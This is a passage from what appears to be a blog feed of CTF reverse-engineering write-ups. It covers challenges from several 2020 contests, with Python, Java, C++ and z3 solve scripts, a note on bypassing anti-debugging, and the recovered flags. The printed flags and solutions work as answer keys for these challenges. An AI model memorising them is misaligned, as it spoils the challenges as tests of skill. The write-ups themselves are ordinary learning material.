0x2C, 0x2E, 0x3F, 0x2F, 0x2A, 0x29, 0x3C, 0x3E, 0x00]t1 = []t2 = []for i in target:    c = i % 40    b = ((i - c) % 1600) // 40    a = i // 1600    t1 += [a, b, c]i = 0while i &lt; len(t1):    if t1[i] == 39:        t2 += [t1[i] + t1[i + 1]]        i += 2    else:        t2 += [t1[i]]        i += 1flag = &#39;&#39;for i in t2:    if ctable[i] != 0x00:        flag += chr(ctable[i])print(flag)</code></pre><p>输出的内容为</p><pre><code>Milos Raonic (born 1990) is a Canadian professional tennis player. He reached a career high world No. 4 singles ranking in May 2015, as ranked by the Association of Tennis Professionals (ATP). His career highlights include a Grand Slam final at the 2016 Wimbledon Championships and two Grand Slam semifinals at the 2014 Wimbledon Championships and 2016 Australian Open. He was the 2011 ATP Newcomer of the Year, and has been ranked continuously inside the top 20 since August 2012. Raonic is the first player born in the 1990s to win an ATP title, to be ranked in the top 10, and to qualify for the ATP World Tour Finals. He has eight ATP singles titles, all won on hard courts. He is frequently described as having one of the best serves among his contemporaries. Statistically, he is among the strongest servers in the Open Era, winning 91p of service games to rank third all time. Aided by his serve, he plays an all court style with an emphasis on short points.</code></pre><p>找到原题发现是求<code>md5</code>，然后发现求<code>md5</code>还求出来好几个……</p><p>正确的那一个</p><pre><code class="bash">-&gt; python3 common.py | md5sum2c8cd31daeba8753815851f13e6370b3  -</code></pre><p><del>这种时候应该找出题人py一个flag</del></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mfc逆向-200_攻防世界</title>
      <link href="/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<p>这题就是一个脑洞题，但可以大概的了解一下windows编程</p><span id="more"></span><p>查壳发现是虚拟机<br><img src="https://s1.ax1x.com/2020/03/24/8b4mz4.png" alt="8b4mz4.png"></p><p>IDA打开，脱壳怕是不可能的了，只能换其他方法。</p><p><del>这里用面向大佬博客做题法</del></p><p>因为<strong>Flag就在控件里</strong>，干脆spy++查看一下</p><p><img src="https://s1.ax1x.com/2020/03/24/8b4uQJ.png" alt="8b4uQJ.png"></p><p>找到句柄，用xspy查一查</p><pre><code>OnMsg:0464,func= 0x00402170(mfc逆向-200.exe+ 0x002170 )</code></pre><p>找到了一个奇怪的东西，但是接下来不知道该怎么做了</p><p><del>然后偷瞄大佬博客</del></p><p>大佬掐指一算应该发个消息，vs启动</p><pre><code class="c++">#include &lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123;    HWND h = FindWindowA(NULL, &quot;Flag就在控件里&quot;);    if (h)    &#123;        SendMessage(h, 0x464, NULL, NULL);    &#125;    return 0;&#125;</code></pre><p>这里只是简单的用到了两个函数</p><p>第一个<code>FindWindowA</code>，定义如下</p><pre><code class="c++">HWND FindWindowA(  LPCSTR lpClassName,  &#123;窗口的类名，可为空&#125;  LPCSTR lpWindowName  &#123;窗口的标题名&#125;);</code></pre><p>这个函数不查找子窗口（<code>FindWindowEx</code>），返回的是这个窗口的句柄，其实就是我们之前用spy++查询到的句柄，也可以用下面的代码</p><pre><code class="c++">auto h = HWND(0xa505f4);</code></pre><p>作用是一样的，找到句柄之后就可以发消息，用到了<code>SendMessage</code></p><p>定义如下</p><pre><code class="c++">LRESULT SendMessage（HWND hWnd，UINT Msg，WPARAM wParam，LPARAM IParam）</code></pre><blockquote><p>参数<br>hWnd：指定要接收消息的窗口的句柄。如果此参数为HWND_BROADCAST，则消息将被发送到系统中所有顶层窗口，包括无效或不可见的非自身拥有的窗口、被覆盖的窗口和弹出式窗口，但消息不被发送到子窗口。<br>Msg：指定被发送的消息。<br>wParam：指定附加的消息特定信息。<br>IParam：指定附加的消息特定信息。<br>返回值：返回值指定消息处理的结果，依赖于所发送的消息。</p></blockquote><p>所以给这个控件发个<code>0x464</code>，然后窗体里面的内容变了，变成了<code>&#123;I am a Des key&#125;</code></p><p>有了key，但是密文是什么……</p><p>大佬掐指一算，之前这个控件有个奇怪的类名<code>944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</code></p><p>解密得到flag</p><pre><code>thIs_Is_real_kEy_hahaaa</code></pre><hr><p><del>不仅懂得比大佬少，脑洞也比不过大佬</del></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> mfc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-re-wp</title>
      <link href="/2020/03/21/BJDCTF-re-wp/"/>
      <url>/2020/03/21/BJDCTF-re-wp/</url>
      
        <content type="html"><![CDATA[<p><del>这么长时间就出了两道这么简单的re出题人的良心不会痛吗</del></p><p>re选手做完两道题结束比赛……</p><p>本来还想做做pwn，有时间再说吧</p><span id="more"></span><h4 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h4><p>随机数用时间种子初始化过了，猜是猜不对的，而且猜对了也没用，会输出flag不在这里，但是可以直接用IDA直接找到flag……</p><pre><code>BJD&#123;S1mple_ReV3r5e_W1th_0D_0r_IDA&#125;</code></pre><h4 id="reverse-8086-ASM-DreamerJack"><a href="#reverse-8086-ASM-DreamerJack" class="headerlink" title="reverse-8086_ASM-DreamerJack"></a>reverse-8086_ASM-DreamerJack</h4><p>16位DOS……</p><p>IDA打开，发现一段数据很奇怪，转换成code</p><pre><code class="asm">mov     cx, 22h ; &#39;&quot;&#39;seg001:0005                 lea     bx, aUDuTZWjQGjzZWz ; &quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;seg001:0009seg001:0009 loc_10039:                              ; CODE XREF: seg001:000F↓jseg001:0009                 mov     di, cxseg001:000B                 dec     diseg001:000C                 xor     byte ptr [bx+di], 1Fhseg001:000F                 loop    loc_10039seg001:0011                 lea     dx, aUDuTZWjQGjzZWz ; &quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;seg001:0015                 mov     ah, 9seg001:0017                 int     21h             ; DOS - PRINT STRINGseg001:0017                                         ; DS:DX -&gt; string terminated by &quot;$&quot;seg001:0019                 retn</code></pre><p>异或，循环，输出……</p><p>跑一下</p><pre><code class="python">target = [0x5D, 0x55, 0x5B, 0x64, 0x75, 0x7E, 0x7C, 0x74, 0x40, 0x7B, 0x7A, 0x40, 0x77, 0x6A, 0x2E, 0x7D, 0x2E, 0x7E,          0x71, 0x40, 0x67, 0x6A, 0x7A, 0x7B, 0x7A, 0x40, 0x77, 0x7A, 0x71, 0x57, 0x7E, 0x2F, 0x62, 0x3B]flag = &#39;&#39;for i in range(0x22):    flag += chr(target[i] ^ 0x1F)print(flag)</code></pre><p>输出flag，其中**<code>$</code>是DOS终止符**</p><pre><code>BJD&#123;jack_de_hu1b1an_xuede_henHa0&#125;$</code></pre><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>溜了，<del>刷攻防世界去了</del></p><p>补作业去了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> BJDCTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HouseplantCTF-wp</title>
      <link href="/2020/03/21/2020-HouseplantCTF/"/>
      <url>/2020/03/21/2020-HouseplantCTF/</url>
      
        <content type="html"><![CDATA[<p>最近没有太多时间，这个比赛又比较简单，就干脆直接放脚本了</p><span id="more"></span><h3 id="beginners"><a href="#beginners" class="headerlink" title="beginners"></a>beginners</h3><h4 id="beginner-1"><a href="#beginner-1" class="headerlink" title="beginner 1"></a>beginner 1</h4><p>base64</p><h4 id="beginner-2"><a href="#beginner-2" class="headerlink" title="beginner 2"></a>beginner 2</h4><pre><code class="python">target = [0x72, 0x74, 0x63, 0x70, 0x7b, 0x62, 0x6f, 0x62, 0x5f, 0x79, 0x6f, 0x75, 0x5f, 0x73, 0x75, 0x63, 0x6b, 0x5f,          0x61, 0x74, 0x5f, 0x62, 0x65, 0x69, 0x6e, 0x67, 0x5f, 0x65, 0x6e, 0x63, 0x6f, 0x75, 0x72, 0x61, 0x67, 0x69,          0x6e, 0x67, 0x7d]flag = &#39;&#39;for i in target:    flag += chr(i)print(flag)# rtcp&#123;bob_you_suck_at_being_encouraging&#125;</code></pre><h3 id="reverse-engineering"><a href="#reverse-engineering" class="headerlink" title="reverse-engineering"></a>reverse-engineering</h3><h4 id="Fragile"><a href="#Fragile" class="headerlink" title="Fragile"></a>Fragile</h4><pre><code class="java">package com.company;import static java.lang.System.exit;import java.util.Scanner;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;public class Main &#123;    public static void main(String[] var0) throws Exception &#123;        String flag = &quot;h1_th3r3_1ts_m3&quot;;        String theflag = &quot;ÐdØÓ§åÍaèÒÁ¡&quot;;        String f=&quot;&quot;;        for (int i = 0; i &lt; flag.length(); i++) &#123;            f += (char) ((int) (theflag.charAt(i)) - (int) (flag.charAt(i)));        &#125;        System.out.println(f);    &#125;&#125;// rtcp&#123;h3y_1ts_n0t_b4d&#125;</code></pre><h4 id="EZ"><a href="#EZ" class="headerlink" title="EZ"></a>EZ</h4><pre><code>rtcp&#123;tH1s_i5_4_r3aL_fL4g_s0_Do_sUbm1T_1t!&#125;</code></pre><h4 id="PZ"><a href="#PZ" class="headerlink" title="PZ"></a>PZ</h4><pre><code>rtcp&#123;iT5_s1mPlY_1n_tH3_C0d3&#125;</code></pre><h4 id="LEMON"><a href="#LEMON" class="headerlink" title="LEMON"></a>LEMON</h4><pre><code>rtcp&#123;y34H_tHiS_a1nT_sEcuR3&#125;</code></pre><h4 id="SQUEEZY"><a href="#SQUEEZY" class="headerlink" title="SQUEEZY"></a>SQUEEZY</h4><pre><code class="python">import base64en = &#39;HxEMBxUAURg6I0QILT4UVRolMQFRHzokRBcmAygNXhkqWBw=&#39;enc = base64.b64decode(en)key = &quot;meownyameownyameownyameownyameownya&quot;flag = &#39;&#39;.join(chr(ord(a) ^b) for a, b in zip(key, enc))print(flag)# rtcp&#123;y0u_L3fT_y0uR_x0r_K3y_bEh1nD!&#125;</code></pre><h4 id="thedanzman"><a href="#thedanzman" class="headerlink" title="thedanzman"></a>thedanzman</h4><pre><code class="python">import base64import codecsen = &quot;=ZkXipjPiLIXRpIYTpQHpjSQkxIIFbQCK1FR3DuJZxtPAtkR&quot;en = en[::-1]key = &quot;nyameowpurrpurrnyanyapurrpurrnyanya&quot;key = codecs.encode(key, &quot;rot_13&quot;)d = codecs.encode(en, &#39;rot_13&#39;)e = base64.b64decode(d)f = &#39;&#39;.join(chr(ord(a) ^ b) for a, b in zip(key, e))print(f)# rtcp&#123;n0w_tH4T_w45_m0r3_cH4lL3NgiNG&#125;</code></pre><h4 id="Breakable"><a href="#Breakable" class="headerlink" title="Breakable"></a>Breakable</h4><pre><code class="java">package com.company;import static java.lang.System.exit;import java.util.Scanner;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;public class Main &#123;    public static void main(String[] var0) throws Exception &#123;        String flag = &quot;k33p_1t_in_pl41n&quot;;        String theflag = &quot;ÒdÝ¾¤¤¾ÙàåÐcÝÆ¥ÌÈáÏÜ¦aã&quot;;        String f1=&quot;&quot;;        String f2=&quot;&quot;;        for (int i = 0; i &lt; flag.length()-2; i++) &#123;            f1 += (char) ((int) (theflag.charAt(i+14)) - (int) (flag.charAt(i+2)));        &#125;        System.out.println(f1);        for (int i = 0; i &lt; flag.length()-2; i++) &#123;            f2 += (char) ((int) (theflag.charAt(i)) - (int) (flag.charAt(i)));        &#125;        System.out.println(f2);    &#125;&#125;// rtcp&#123;0mg_1m_s0_pr0ud_&#125;</code></pre><h4 id="Bendy"><a href="#Bendy" class="headerlink" title="Bendy"></a>Bendy</h4><pre><code class="python">flag = &quot;r34l_g4m3rs_eXclus1v3&quot;theflag = &quot;ÄÑÓ¿ÂÒêáøz§è§ñy÷¦&quot;f1 = theflag[:9]f2 = theflag[9:]ff = &quot;&quot;f = &quot;&quot;for i in range(9):    ff += chr(ord(f2[i]) - 20)for i in range(9):    ff += f1for i in range(10, 15):    f += chr(ord(ff[i - 3]) - ord(flag[i]))f += &quot; &quot;for i in range(7):    f += chr(ord(ff[i]) - ord(flag[i]))for i in range(15, 21):    f += chr(ord(ff[i - 3]) - ord(flag[i - 3]))print(f)#rtcp&#123;hop3_y0ur3_h4v1ng_fun&#125;</code></pre><h4 id="Tough"><a href="#Tough" class="headerlink" title="Tough"></a>Tough</h4><pre><code class="java">package com.company;import java.util.HashMap;public class Main &#123;    public static int[] realflag = &#123;9, 4, 23, 8, 17, 1, 18, 0, 13, 7, 2, 20, 16, 10, 22, 12, 19, 6, 15, 21, 3, 14, 5, 11&#125;;    public static int[] therealflag = &#123;20, 16, 12, 9, 6, 15, 21, 3, 18, 0, 13, 7, 1, 4, 23, 8, 17, 2, 10, 22, 19, 11, 14, 5&#125;;    public static HashMap&lt;Integer, Character&gt; theflags = new HashMap&lt;&gt;();    public static HashMap&lt;Integer, Character&gt; theflags0 = new HashMap&lt;&gt;();    public static HashMap&lt;Integer, Character&gt; theflags1 = new HashMap&lt;&gt;();    public static HashMap&lt;Integer, Character&gt; theflags2 = new HashMap&lt;&gt;();    public static boolean m = true;    public static boolean g = false;    public static void createMap(HashMap owo, String input, boolean uwu) &#123;        if (uwu) &#123;            for (int i = 0; i &lt; input.length(); i++) &#123;                owo.put(realflag[i], input.charAt(i));            &#125;        &#125; else &#123;            for (int i = 0; i &lt; input.length(); i++) &#123;                owo.put(therealflag[i], input.charAt(i));            &#125;        &#125;    &#125;    public static void main(String[] var0) throws Exception &#123;        String flag = &quot;ow0_wh4t_4_h4ckr_y0u_4r3&quot;;        createMap(theflags0, flag, g);        createMap(theflags2, flag, m);        int[] thefinalflag = &#123;157, 157, 236, 168, 160, 162, 171, 162, 165, 199, 169, 169, 160, 194, 235, 207, 227, 210, 157, 203, 227, 104, 212, 202&#125;;        String s=&quot;&quot;;        char[] f = new char[24];        for (int p = 0; p &lt; thefinalflag.length; p++) &#123;            if (thefinalflag[p] &gt;= 156 &amp;&amp; thefinalflag[p] &lt;= 166)                thefinalflag[p] -= 10;            thefinalflag[p] -= theflags0.get(p);//            s+=(char)(thefinalflag[p]);        &#125;//        System.out.println(s);        thefinalflag[8]+=10;        thefinalflag[5]+=10;//        System.out.println((char)thefinalflag[8]);        for(int i=0;i&lt;thefinalflag.length-3;i++)        &#123;            int j=0;            for(;j&lt;realflag.length;j++)            &#123;                if(realflag[j]==i)                    break;            &#125;            f[j]=(char)thefinalflag[i];        &#125;        System.out.println(f);        for(int i=thefinalflag.length-3;i&lt;thefinalflag.length;i++)        &#123;            int j=0;            for(;j&lt;therealflag.length;j++)            &#123;                if(therealflag[j]==i)                    break;            &#125;            f[j]=(char)thefinalflag[i];        &#125;        System.out.println(f);    &#125;&#125;//rtcp&#123;h3r3s_4_c0stly_fl4g_4you&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> HouseplantCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SharkCTF-wp</title>
      <link href="/2020/03/21/2020-SharkCTF/"/>
      <url>/2020/03/21/2020-SharkCTF/</url>
      
        <content type="html"><![CDATA[<p>SharkCTF-wp</p><span id="more"></span><h4 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h4><h5 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h5><p>An easy asm, as we can see, every single <code>byte</code> in <code>the_second_array</code> is xored, and then plus the <code>byte</code> with the same index in <code>some_array</code></p><pre><code class="asm">BITS 64SECTION .rodata    some_array db 10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24    the_second_array db 0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf    len_second_array equ $ - the_second_arraySECTION .text    GLOBAL mainmain:    mov rdx, [rsp]    cmp rdx, 2    jne exit    mov rsi, [rsp+0x10]    mov rdx, rsi    mov rcx, 0l1:    cmp byte [rdx], 0    je follow_the_label    inc rcx    inc rdx    jmp l1follow_the_label:    mov al, byte [rsi+rcx-1]    mov rdi,  some_array    mov rdi, [rdi+rcx-1]    add al, dil    xor rax, 42    mov r10, the_second_array    add r10, rcx    dec r10    cmp al, byte [r10]    jne exit    dec rcx    cmp rcx, 0    jne follow_the_labelwin:    mov rdi, 1    mov rax, 60    syscallexit:    mov rdi, 0    mov rax, 60    syscall</code></pre><p>So it’s easy to solve it with python using simple script blow</p><pre><code class="python">target=[0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf]some_array=[10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24]flag=&quot;&quot;for i,t in enumerate(target):    flag+=chr((t^42)-some_array[i])print(flag)# shkCTF&#123;h3ll0_fr0m_ASM_my_fr13nd&#125;</code></pre><h5 id="z3-robot"><a href="#z3-robot" class="headerlink" title="z3_robot"></a>z3_robot</h5><p>Just input and then pass a few equations, so it’s quite easy to solve it with z3 as the title says</p><pre><code class="python">from z3 import *a1 = []for i in range(25):    a1.append(BitVec(&quot;s%d&quot; % i, 32))solver = Solver()solver.add((a1[20] ^ 0x2B) == a1[7])solver.add(a1[21] - a1[3] == -20)solver.add((a1[2] &gt;&gt; 6) == 0)solver.add(a1[13] == 116)solver.add(4 * a1[11] == 380)solver.add(a1[7] &gt;&gt; a1[17] % 8 == 5)solver.add((a1[6] ^ 0x53) == a1[14])solver.add(a1[8] == 122)solver.add(a1[5] &lt;&lt; a1[9] % 8 == 392)solver.add(a1[16] - a1[7] == 20)solver.add(a1[7] &lt;&lt; a1[23] % 8 == 190)solver.add(a1[2] - a1[7] == -43)solver.add(a1[21] == 95)solver.add((a1[2] ^ 0x47) == a1[3])solver.add(a1[0] == 99)solver.add(a1[13] == 116)solver.add((a1[20] &amp; 0x45) == 68)solver.add((a1[8] &amp; 0x15) == 16)solver.add(a1[12] == 95)solver.add(a1[4] &gt;&gt; 4 == 7)solver.add(a1[13] == 116)solver.add(a1[0] &gt;&gt; a1[0] % 8 == 12)solver.add(a1[10] == 95)solver.add((a1[8] &amp; 0xAC) == 40)solver.add(a1[16] == 115)solver.add((a1[22] &amp; 0x1D) == 24)solver.add(a1[9] == 51)solver.add(a1[5] == 49)solver.add(4 * a1[19] == 456)solver.add(a1[20] &gt;&gt; 6 == 1)solver.add(a1[7] &gt;&gt; 1 == 47)solver.add(a1[1] == 108)solver.add(a1[3] &gt;&gt; 4 == 7)solver.add((a1[19] &amp; 0x49) == 64)solver.add(a1[4] == 115)solver.add((a1[2] &amp; a1[11]) == 20)solver.add(a1[0] == 99)solver.add(a1[4] + a1[5] == 164)solver.add(a1[15] &lt;&lt; 6 == 6080)solver.add((a1[10] ^ 0x2B) == a1[17])solver.add((a1[12] ^ 0x2C) == a1[4])solver.add(a1[19] - a1[21] == 19)solver.add(a1[12] == 95)solver.add(a1[15] &gt;&gt; 1 == 47)solver.add(a1[19] == 114)solver.add(a1[17] + a1[18] == 168)solver.add(a1[22] == 58)solver.add((a1[23] &amp; a1[21]) == 9)solver.add(a1[6] &lt;&lt; a1[19] % 8 == 396)solver.add(a1[3] + a1[7] == 210)solver.add((a1[22] &amp; 0xED) == 40)solver.add((a1[12] &amp; 0xAC) == 12)solver.add((a1[18] ^ 0x6B) == a1[15])solver.add((a1[16] &amp; 0x7A) == 114)solver.add((a1[0] &amp; 0x39) == 33)solver.add((a1[6] ^ 0x3C) == a1[21])solver.add(a1[20] == 116)solver.add(a1[19] == 114)solver.add(a1[12] == 95)solver.add(a1[2] == 52)solver.add(a1[23] == 41)solver.add(a1[10] == 95)solver.add((a1[22] &amp; a1[9]) == 50)solver.add(a1[3] + a1[2] == 167)solver.add(a1[17] - a1[14] == 68)solver.add(a1[21] == 95)solver.add((a1[19] ^ 0x2D) == a1[10])solver.add(4 * a1[12] == 380)solver.add(a1[6] &amp; 0x40 != 0)solver.add((a1[12] &amp; a1[22]) == 26)solver.add(a1[7] &lt;&lt; a1[19] % 8 == 380)solver.add((a1[20] ^ 0x4E) == a1[22])solver.add(a1[6] == 99)solver.add(a1[12] == a1[7])solver.add(a1[19] - a1[13] == -2)solver.add(a1[14] &gt;&gt; 4 == 3)solver.add((a1[12] &amp; 0x38) == 24)solver.add(a1[8] &lt;&lt; a1[10] % 8 == 15616)solver.add(a1[20] == 116)solver.add(a1[6] &gt;&gt; a1[22] % 8 == 24)solver.add(a1[22] - a1[5] == 9)solver.add(a1[7] &lt;&lt; a1[22] % 8 == 380)solver.add(a1[22] == 58)solver.add(a1[16] == 115)solver.add((a1[23] ^ 0x1D) == a1[18])solver.add(a1[23] + a1[14] == 89)solver.add((a1[5] &amp; a1[2]) == 48)solver.add((a1[15] &amp; 0x9F) == 31)solver.add(a1[4] == 115)solver.add((a1[23] ^ 0x4A) == a1[0])solver.add((a1[6] ^ 0x3C) == a1[11])flag = &quot;&quot;if solver.check() == sat:    r = solver.model()    for i in range(24):        flag += chr(r[a1[i]].as_long() &amp; 0xff)print(flag)# shkCTF&#123;cl4ss1c_z3___t0_st4rt_:)&#125;</code></pre><h5 id="secure-db"><a href="#secure-db" class="headerlink" title="secure_db"></a>secure_db</h5><p>I can’t see anything using IDA so I debugged it and I found the input got processed and then compared with <code>N3kviX7-vXEqvlp</code> , I just input this string and got an interesting string <code>T4h7s_4ll_F0lks</code> which seems like to be the right one.</p><p>So this reversing algorithm seems to be itself, and I tried to rewrite it with python and I got the same answer</p><pre><code class="python">target = &quot;N3kviX7-vXEqvlp&quot;x = [0x1a, 0x07, 0x03, 0x41]key = &quot;&quot;for i, c in enumerate(target):    key += chr(ord(c) ^ x[i % 4])print(key)# T4h7s_4ll_F0lks</code></pre><p>Just input the key and we will get a database file from the server, and there is the flag.</p><h5 id="miss-direction"><a href="#miss-direction" class="headerlink" title="miss_direction"></a>miss_direction</h5><p>Actually I haven’t solved it yet, I however managed to anti anti-debug (just remove tls table from PE headers will be fine), and then the exception handler really confused me,I can’t find anything to do with my input, I really got missed… </p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> SharkCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-wp</title>
      <link href="/2020/03/21/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2020/03/21/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>网鼎杯-wp</p><span id="more"></span><h4 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h4><p>很简单的<code>vm</code>，甚至可以一位一位解</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+18h] [ebp-1D4h]  __main();  qmemcpy(&amp;v4, &amp;opcodes, 0x1C8u);  vm_operad(&amp;v4, 114);  puts(&quot;good,The answer format is:flag &#123;&#125;&quot;);  return 0;&#125;</code></pre><p><code>vm_operad</code>中包含了一些指令，很好理解，甚至不需要调试就可以看懂</p><pre><code class="cpp">0xA: read0x1: 将结果写入target0x8: 暂存计算结果到input0x7 x: input[i]==x ? i++ : exit(0) 0x2 x: input+x0x3 x: input-LOBYTE(x)0x4 x: input^x0x5 x: input*x0x6 x: nop0xB: input--0xC: input++</code></pre><p><code>read</code>函数进行了输入的一些控制</p><pre><code class="cpp">size_t __cdecl read(char *a1)&#123;  size_t result; // eax  printf(&quot;string:&quot;);  scanf(&quot;%s&quot;, a1);  result = strlen(a1);  if ( result != 15 )  &#123;    puts(&quot;WRONG!\n&quot;);    exit(0);  &#125;  return result;&#125;</code></pre><p>flag的长度为15位，再观察<code>opcode</code>，可以发现是一位一位进行处理，经过一种运算然后<code>0x8</code>暂存，然后再经过一种计算将结果写入最终<code>target</code>，所以可以有两种解法，可以一位一位的逆<code>flag</code>，也可以逆<code>vm</code>的指令</p><ul><li><p>逐位计算<code>flag</code></p><pre><code class="python">target = [0x22, 0x3F, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31,          0xF1, 0x28, 0x84, 0xC1, 0x1E, 0x7A]flag = &quot;&quot;flag += chr((target[0] + 5) ^ 0x10)flag += chr((target[1] // 3) ^ 0x20)flag += chr((target[2] + 1) + 2)flag += chr((target[3] - 1) ^ 4)flag += chr((target[4] + 0x21)//3)flag += chr(target[5] + 2)flag += chr((target[6] + 0x20) ^ 0x9)flag += chr((target[7] ^ 0x24) - 0x51)flag += chr(target[8])flag += chr((target[9] - 0x25) // 2)flag += chr((target[10] ^ 0x41) - 0x36)flag += chr(target[11] - 0x20)flag += chr((target[12] - 0x25) // 3)flag += chr((target[13] + 0x20) ^ 9)flag += chr((target[14] - 1) - 0x41)print(flag)# 757515121f3d478</code></pre></li><li><p>调整<code>vm</code>指令</p><p>把每一个运算改成逆运算，然后将每一位的两次计算交换顺序</p><pre><code class="cpp">#include &lt;iostream&gt;#include &quot;ida.h&quot;using namespace std;int __cdecl vm_operad(unsigned int *opcode, int len) &#123;    int result; // eax    unsigned int input[100] = &#123;0x22, 0x3F, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31,                               0xF1, 0x28, 0x84, 0xC1, 0x1E, 0x7A&#125;; // [esp+13h] [ebp-E5h]    char v4[100] = &#123;0&#125;; // [esp+77h] [ebp-81h]    string flag;    unsigned char v5; // [esp+DBh] [ebp-1Dh]    int v6; // [esp+DCh] [ebp-1Ch]    int v7; // [esp+E0h] [ebp-18h]    int v8; // [esp+E4h] [ebp-14h]    int v9; // [esp+E8h] [ebp-10h]    int opcode_index; // [esp+ECh] [ebp-Ch]    opcode_index = 0;    v9 = 0;    v8 = 0;    v7 = 0;    v6 = 0;    while (true) &#123;        result = opcode_index;        if (opcode_index &gt;= len) &#123;            cout &lt;&lt; flag &lt;&lt; endl;            return result;        &#125;        switch (opcode[opcode_index]) &#123;            case 1:                flag += v5;                ++opcode_index;                ++v7;                ++v9;                break;            case 2:                v5 = input[v9] - opcode[opcode_index + 1];                opcode_index += 2;                break;            case 3:                v5 = input[v9] + LOBYTE(opcode[opcode_index + 1]);                opcode_index += 2;                break;            case 4:                v5 = opcode[opcode_index + 1] ^ input[v9];                opcode_index += 2;                break;            case 5:                v5 = input[v9] / opcode[opcode_index + 1];                opcode_index += 2;                break;            case 6:                ++opcode_index;                break;            case 7:                ++v8;                opcode_index += 2;                break;            case 8:                input[v6] = v5;                ++opcode_index;                ++v6;                break;            case 10://                read(input);                ++opcode_index;                break;            case 11:                v5 = input[v9] + 1;                ++opcode_index;                break;            case 12:                v5 = input[v9] - 1;                ++opcode_index;                break;            default:                continue;        &#125;    &#125;&#125;unsigned int opcodes[114] = &#123;        0x0000000A,        0x00000003, 0x00000005,        0x00000008,        0x00000004, 0x00000010,        0x00000001,        0x00000005, 0x00000003,        0x00000008,        0x00000004, 0x00000020,        0x00000001,        0x0000000B,        0x00000008,        0x00000003, 0x00000002,        0x00000001,        0x00000004, 0x00000004,        0x00000008,        0x0000000C,        0x00000001,        0x00000003, 0x00000021,        0x00000008,        0x00000005, 0x00000003,        0x00000001,        0x0000000B,        0x00000008,        0x0000000B,        0x00000001,        0x00000003, 0x00000020,        0x00000008,        0x00000004, 0x00000009,        0x00000001,        0x00000004, 0x00000024,        0x00000008,        0x00000002, 0x00000051,        0x00000001,        0x0000000B,        0x00000008,        0x0000000C,        0x00000001,        0x00000002, 0x00000025,        0x00000008,        0x00000005, 0x00000002,        0x00000001,        0x00000004, 0x00000041,        0x00000008,        0x00000002, 0x00000036,        0x00000001,        0x00000005, 0x00000001,        0x00000008,        0x00000002, 0x00000020,        0x00000001,        0x00000002, 0x00000025,        0x00000008,        0x00000005, 0x00000003,        0x00000001,        0x00000003, 0x00000020,        0x00000008,        0x00000004, 0x00000009,        0x00000001,        0x0000000C,        0x00000008,        0x00000002, 0x00000041,        0x00000001,        0x00000007, 0x00000022, 0x00000007, 0x0000003F,        0x00000007, 0x00000034, 0x00000007, 0x00000032, 0x00000007, 0x00000072, 0x00000007, 0x00000033,        0x00000007, 0x00000018, 0x00000007, 0xFFFFFFA7, 0x00000007, 0x00000031, 0x00000007, 0xFFFFFFF1,        0x00000007, 0x00000028, 0x00000007, 0xFFFFFF84, 0x00000007, 0xFFFFFFC1, 0x00000007, 0x0000001E,        